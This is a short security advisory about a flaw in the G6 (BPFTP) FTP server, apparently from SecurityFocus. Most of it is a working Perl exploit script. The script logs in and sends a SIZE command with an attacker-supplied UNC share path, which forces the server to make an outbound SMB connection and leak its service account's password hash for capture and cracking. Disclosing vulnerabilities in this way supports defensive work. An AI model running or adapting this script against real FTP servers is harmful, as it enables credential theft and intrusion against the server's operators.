source: http://www.securityfocus.com/bid/2534/info

G6 FTP Server now known as BPFTP Server is an internet FTP server by Gene6

If a logged in FTP user connects to an external share and submits a malformed 'size' or 'mdtm' command, the user could force the FTP server to make an external SMB connection.

The FTP server must provide login credentials of the user the server is running under in order to make a connection to the remote host. A password hash is sent across the external connection to the host. A third party network utility could be listening for internal and external traffic and capture the password hash. The captured hash could be resolved into the username and password.

#!/usr/bin/perl
# G6-2nbt.pl - example G6 ftp server netbios connection script
#
# Tested on win32 and Linux, Linux requires share name to be in
# the format: \\\\host\\share\\path or //host/share/path

use Getopt::Std;
use IO::Socket;

my($host,$login,$pass,$share,$CRLF,$result);

$CRLF = "\015\012";
getopts('h:l:p:s:',\%args);

if (!defined $args{h}){ print "No host specified.\n";exit;}else{$host =
$args{h};}
if (!defined $args{s}){ print "No share specified.\n";exit;}else{$share =
$args{s};}
if (!defined $args{l} || !defined $args{p}){($login,$pass) =
('anonymous','user@myhost.com');}
else { ($login,$pass) = ($args{l},$args{p});}

$our_sock =
IO::Socket::INET->new(Proto=>'tcp',PeerAddr=>$host,PeerPort=>21)||
die("Socket problems.");

print "Connected!\n";
print "Login...";

print $our_sock "USER $login" . $CRLF;
$result = <$our_sock>;
if ($result !~ /331\s/) { print "User name not accepted or an error
occurred...exiting.\n";close($our_sock);exit; }

print "good.\nPass....";

print $our_sock "PASS $pass" . $CRLF;
$result = <$our_sock>;
if ($result !~ /230\s/) { if ($result =~ /530\s/) { print "Login/password
incorrect exiting.\n";close($our_sock);exit; } else { print "Login
failure..exiting.\n";close($our_sock);exit; }}

print "good.\nTesting path type...";

print $our_sock "PWD" . $CRLF;
$result = <$our_sock>;
$result = <$our_sock>;
if (lc($result) !~ /\/[a-z][:]\//) { print "Looks like 'show relative
path' is enabled...exiting.\n";close($our_sock);exit;}

print "not relative path.\nSending UNC to connect to...";

print $our_sock "SIZE $share" . $CRLF;
print "completed.\nCheck your logs.\n";

close($our_sock);
exit;